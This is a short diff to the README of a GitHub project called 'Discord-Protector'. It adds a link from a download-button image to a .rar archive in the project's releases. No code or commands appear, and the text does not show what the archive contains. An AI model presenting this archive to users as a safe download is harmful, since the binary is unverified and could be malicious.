@@ -11,7 +11,7 @@
 [Showcase](https://github.com/Hax0RX/Discord-Protector/blob/main/README.md#showcase)<br/>
 [Credits](https://github.com/Hax0RX/Discord-Protector/blob/main/README.md#credits)<br/>
   
-<a href="">
+<a href="https://github.com/Hax0rX/Discord-Protector/releases/download/Discord-Protector/Discord.Protector.rar">
   <img src="https://i.postimg.cc/tJZbcxjp/New-3-Projec11112323t33download.png"/>
 </a>
   
